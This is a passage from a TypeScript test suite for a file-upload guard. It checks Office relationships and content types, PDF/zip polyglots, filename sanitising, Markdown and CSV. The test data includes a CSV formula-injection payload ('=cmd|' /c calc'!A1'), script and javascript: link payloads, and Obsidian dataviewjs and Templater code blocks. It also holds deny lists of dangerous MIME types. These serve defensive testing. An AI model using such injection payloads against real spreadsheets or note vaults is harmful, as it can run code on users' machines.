  for (const f of ["'My Sheet'!A1+'It''s'!B2", "SUM('Q1 Data'!A1:A9)"]) {
    assert.equal(contentMatches(".xlsx", xlsx(sheet(fcell(f.replaceAll("&", "&amp;"))))), true, f);
  }
});

// Comments outside the root element.

test("generator comments before or after the root element are allowed; inside the root they are refused", () => {
  const C = "<!--Generated by a third-party library-->";
  const lead = (xml: string) => xml.replace(XML_DECL, XML_DECL + "\n" + C + "\n");
  const pptxWithComments = zip([
    { name: "[Content_Types].xml", data: C + CONTENT_TYPES.replace('<?xml version="1.0" encoding="UTF-8"?>', ""), deflate: true },
    { name: "_rels/.rels", data: rels(`<Relationship Id="rId1" Type="${RT}officeDocument" Target="ppt/presentation.xml"/>`).replace("?>", "?>" + C), deflate: true },
    { name: "ppt/presentation.xml", data: XML_DECL + C + "<p:presentation/>" + "\n" + C + "\n", deflate: true },
    { name: "ppt/slides/slide1.xml", data: lead(slide("")), deflate: true },
  ]);
  assert.equal(contentMatches(".pptx", pptxWithComments), true);
  assert.equal(contentMatches(".pptx", pptx(slide(C))), false);
  assert.equal(contentMatches(".docx", docx(lead(wdoc(wrun("x") + C)))), false);
  assert.equal(contentMatches(".docx", docx(lead(wdoc(wrun("x"))) + C)), true);
});

// PDF polyglot.

test("a PDF that also carries a zip archive is refused", () => {
  const lfh = Buffer.from([0x50, 0x4b, 0x03, 0x04]);
  const eocd = Buffer.from([0x50, 0x4b, 0x05, 0x06]);
  const polyglot = Buffer.concat([Buffer.from("%PDF-1.7\n"), lfh, Buffer.from("zipdata"), eocd, Buffer.alloc(18)]);
  assert.equal(contentMatches(".pdf", polyglot), false);
  assert.equal(contentMatches(".pdf", Buffer.concat([Buffer.from("%PDF-1.7\n"), lfh, Buffer.from(" only a header")])), true);
  assert.equal(contentMatches(".pdf", Buffer.concat([Buffer.from("%PDF-1.7\n"), eocd])), true);
});

/** Runs `fn` and asserts it took under `ms` milliseconds. */
function fast(what: string, fn: () => unknown, ms = 500): void {
  const t = performance.now();
  fn();
  const took = performance.now() - t;
  assert.ok(took < ms, `${what} took ${took.toFixed(0)} ms`);
}

const MB = 1024 * 1024 - 4096;
const pad = (unit: string) => unit.repeat(Math.floor(MB / unit.length));
const relsPart = (body: string) =>
  zip([{ name: "[Content_Types].xml", data: CONTENT_TYPES }, { name: "_rels/.rels", data: body }]);
const typesPart = (body: string) => zip([{ name: "[Content_Types].xml", data: body }]);

const SLOW_INPUTS: [string, () => Buffer][] = [
  ["1 MB of '<' in a .rels", () => relsPart(pad("<"))],
  ["'<a' repeated in a .rels", () => relsPart(pad("<a"))],
  ["one Relationship start then '<a' repeated", () => relsPart("<Relationship " + pad("<a"))],
  ["one Relationship with endless attributes", () => relsPart("<Relationship" + pad(' a="x"'))],
  ["'<x:' repeated", () => relsPart(pad("<x:"))],
  ["'<Relationship' repeated", () => relsPart(pad("<Relationship"))],
  ["'TargetMode' plus spaces", () => relsPart("TargetMode" + pad(" "))],
  ["'TargetMode=' repeated", () => relsPart(pad("TargetMode= "))],
  ["XML declaration without an end", () => relsPart("<?xml" + pad(" "))],
  ["declaration with repeated encoding=", () => relsPart("<?xml " + pad("encoding= "))],
  ["'&#x' plus digits", () => relsPart("&#x" + pad("0"))],
  ["'&#x' repeated", () => relsPart(pad("&#x0"))],
  ["'ContentType=\"' repeated", () => typesPart(pad('ContentType="'))],
  ["'ContentType=' plus one open quote", () => typesPart("ContentType='" + pad("a"))],
  ["'ContentType' plus spaces", () => typesPart("ContentType" + pad(" "))],
];

for (const [what, make] of SLOW_INPUTS) {
  test(`content check is linear: ${what}`, () => {
    const data = make();
    for (const ext of [".docx", ".xlsx"]) fast(`${what} (${ext})`, () => contentMatches(ext, data));
  });
}

test("text and magic-byte checks are linear on 1 MB inputs", () => {
  for (const ext of [".txt", ".csv", ".md", ".pdf", ".png", ".heic", ".gif"]) {
    fast(ext, () => contentMatches(ext, Buffer.from(pad("<a"))));
  }
});

test("sanitizeFilename is linear on hostile 1 MB names", () => {
  for (const [what, name] of [
    ["dots then x", pad(".") + "x"],
    ["dot-space runs", pad(". ") + "x.pdf"],
    ["trailing dots", "a" + pad(".")],
    ["slashes", pad("a/")],
    ["control chars", pad("\u0000\u200B")],
    ["many extensions", pad("a.")],
  ] as const) {
    fast(what, () => sanitizeFilename(name, ".pdf"));
  }
});

test("relationship parsing accepts ordinary attribute layouts", () => {
  for (const r of [
    `<Relationship Id="r" Type="${RT}styles" Target="styles.xml"/>`,
    `<Relationship Target='styles.xml' Type='${RT}styles' Id='r' />`,
    `<Relationship\n  Id="r"\n  Type="${RT}image"\n  Target="media/a&amp;b.png"\n  TargetMode="Internal"/>`,
    `<Relationship Id="r" Type="${RT}styles" Target="a>b.xml"></Relationship>`,
    `<pr:Relationship xmlns:pr="${PKG_NS}" Id="r" Type="${RT}styles" Target="s.xml"/>`,
  ]) {
    assert.equal(contentMatches(".docx", docParts([], [r])), true, r);
  }
});

test("relationship allowlist accepts the plain document parts", () => {
  const allowed = [
    "styles", "settings", "webSettings", "fontTable", "theme", "numbering", "image", "header", "footer",
    "footnotes", "endnotes", "comments", "worksheet", "sharedStrings", "slide", "slideLayout", "slideMaster",
    "notesSlide", "presProps", "viewProps", "tableStyles", "extended-properties", "custom-properties",
  ].map((n) => rel(RT + n));
  allowed.push(rel("http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties"));
  allowed.push(rel("http://schemas.microsoft.com/office/2007/relationships/stylesWithEffects"));
  allowed.push(rel("http://purl.oclc.org/ooxml/officeDocument/relationships/styles"));
  assert.equal(contentMatches(".docx", docParts([], allowed)), true);
});

const typesWith = (ct: string) =>
  CONTENT_TYPES.replace("</Types>", `<Override PartName="/word/x.xml" ContentType="${ct}"/></Types>`);

for (const ct of [
  "application/vnd.openxmlformats-officedocument.oleObject",
  "application/x-msdownload",
  "application/vnd.ms-office.activeX+xml",
  "application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml",
  "image/svg+xml",
  "text/html",
  "application/octet-stream",
]) {
  test(`content-type allowlist refuses ${ct}`, () => {
    const z = zip([{ name: "[Content_Types].xml", data: typesWith(ct), deflate: true }, { name: "word/document.xml", data: "<w/>" }]);
    assert.equal(contentMatches(".docx", z), false);
  });
}

test("content-type allowlist accepts the plain document part types", () => {
  const cts = [
    "application/vnd.openxmlformats-officedocument.wordprocessingml.styles+xml",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml",
    "application/vnd.openxmlformats-officedocument.theme+xml",
    "application/vnd.openxmlformats-package.core-properties+xml",
    "application/vnd.openxmlformats-officedocument.extended-properties+xml",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml",
    "application/vnd.openxmlformats-officedocument.presentationml.slide+xml",
    "application/xml",
    "image/png",
    "image/jpeg",
  ];
  const types = CONTENT_TYPES.replace("</Types>", cts.map((c, i) => `<Override PartName="/p${i}.xml" ContentType="${c}"/>`).join("") + "</Types>");
  const z = zip([{ name: "[Content_Types].xml", data: types, deflate: true }, { name: "word/document.xml", data: "<w/>" }]);
  assert.equal(contentMatches(".docx", z), true);
});

for (const nested of ["word/media/a.bin", "x/inner.docm", "x/inner.xlsm", "x/inner.pptm", "x/inner.docx", "x/inner.XLSX", "inner.pptx"]) {
  test(`nested binary or document entry is refused: ${nested}`, () => {
    assert.equal(contentMatches(".docx", docParts([{ name: nested, data: "x" }])), false);
  });
}

// --- Markdown is opt-in ---

test("Markdown is refused by default with a message saying how to enable it", async () => {
  await assert.rejects(saveFile(cfg, HOME, "n.md", Buffer.from("# hi\n")), (e: unknown) => {
    assert.ok(e instanceof GuardError);
    assert.equal(e.code, "TYPE_NOT_ALLOWED");
    assert.equal(e.message, "Markdown files are disabled; set allowMarkdown: true to enable (see SECURITY.md)");
    return true;
  });
  assert.deepEqual(await fs.readdir(path.join(cfg.vault.root, HOME)), []);
});

test("benign Markdown is accepted when allowMarkdown is true", async () => {
  const on = { ...cfg, allowMarkdown: true };
  const md = "# Notes\n\n- item\n\n```json\n{\"a\": 1}\n```\n\n```python\nprint(1)\n```\n\nSee [link](https://example.com).\n";
  assert.equal(await saveFile(on, HOME, "ok.md", Buffer.from(md)), `${HOME}/ok.md`);
});

const DANGEROUS_MD = [
  "```dataviewjs\ndv.paragraph(1)\n```",
  "```dataview\nTABLE file.name\n```",
  "```js-engine\nreturn 1\n```",
  "```javascript\nalert(1)\n```",
  "```js\nalert(1)\n```",
  "```button\nname x\n```",
  "```meta-bind-js\nx\n```",
  "~~~dataviewjs\nx\n~~~",
  "> ```DataViewJS\n> x",
  "````  JS {x}\nx",
  "<% tp.system.prompt() %>",
  "<script>alert(1)</script>",
  "<SCRIPT src=x>",
  "<iframe src=x>",
  "<IFrame src=x>",
  "<object data=x>",
  "<embed src=x>",
  "[x](javascript:alert(1))",
  "[x](JaVaScRiPt:alert(1))",
];

for (const body of DANGEROUS_MD) {
  test(`Markdown is refused when enabled: ${JSON.stringify(body.slice(0, 24))}`, async () => {
    const on = { ...cfg, allowMarkdown: true };
    assert.equal(await code(saveFile(on, HOME, "bad.md", Buffer.from("# t\n\n" + body + "\n"))), "TYPE_NOT_ALLOWED");
    assert.deepEqual(await fs.readdir(path.join(cfg.vault.root, HOME)), []);
  });
}

// --- CSV formula injection ---

const csvOk = (s: string) => contentMatches(".csv", Buffer.from(s));

test("CSV fields that start a formula are refused", () => {
  for (const s of [
    "a,b\n=cmd|' /c calc'!A1,2\n",
    "a\n+1+1\n",
    "a\n@SUM(1)\n",
    "a\n-cmd\n",
    "a,b\n1,\"=1+1\"\n",
    "a,b\n1,  =1+1\n",
    "a,b\n1,\"  =1+1\"\n",
    "a,b\r\n1,\t2\r\n",
    "a,b\n1,\"\t2\"\n",
    "a,b\n1,\"line\nbreak\",\"x\"\"y\",\n=1\n",
    "a\n-\"\"x\n",
    "a\r\r=1\n",
    "=1\n",
  ]) {
    assert.equal(csvOk(s), false, JSON.stringify(s));
  }
});

test("ordinary CSV with negative numbers and quoted commas is accepted", () => {
  for (const s of [
    "name,amount,note\r\nBob,-5,\"a, b\"\r\nAmy,-0.5,\"say \"\"hi\"\"\"\r\nZed,-.5,\"x\ny=z\"\n",
    "a,b\n1,2",
    "a,b\n\"-3\",x+y\n",
    "a,b\n-,a=b\n",
    "",
  ]) {
    assert.equal(csvOk(s), true, JSON.stringify(s));
  }
});

test("CSV check is linear on 1 MB of hostile filler", () => {
  for (const [what, s] of [
    ["quotes", '"'.repeat(1 << 20)],
    ["escaped quotes", '"' + '""'.repeat(1 << 19)],
    ["commas", ",".repeat(1 << 20)],
    ["minus runs", "-".repeat(1 << 20)],
    ["spaces then quote", " ".repeat(1 << 20) + '"'],
    ["crlf", "a\r\n".repeat(1 << 18)],
    ["lone CRs", "a\r".repeat(1 << 19)],
  ] as const) {
    fast(`csv ${what}`, () => csvOk(s));
  }
});
